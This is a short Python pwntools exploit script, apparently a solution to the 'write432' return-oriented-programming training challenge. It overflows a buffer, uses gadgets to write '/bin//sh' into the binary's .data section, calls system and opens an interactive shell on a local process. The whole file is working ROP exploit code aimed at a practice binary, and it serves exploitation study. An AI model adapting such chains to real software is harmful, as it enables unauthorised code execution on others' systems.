#!/usr/bin/python

from pwn import *

garbage = "A"*44

#readelf -S write432
data_section = 0x0804a028

system_addr = p32(0x08048430)

#objdump -d write432 | grep ret -B 3
mov_ebp_edi = p32(0x08048670) #mov DWORD PTR [edi],ebp

#ropsearch "pop edi"
pop_edi_pop_ebp = p32(0x080486da)  #pop edi; pop ebp; ret

deadbeef = p32(0xdeadbeef)

exploit  = garbage
#Move '/bin' in the .data section
exploit += pop_edi_pop_ebp
exploit += p32(data_section)
exploit += '/bin'
exploit += mov_ebp_edi
#Move '//sh' in the .data section after the '/bin' string
exploit += pop_edi_pop_ebp
exploit += p32(data_section + 0x4)
exploit += '//sh'
exploit += mov_ebp_edi
#Call system('/bin//sh')
exploit += system_addr
exploit += deadbeef
exploit += p32(data_section)

p = process("./write432")

p.sendlineafter("> ",exploit)
print p.interactive()
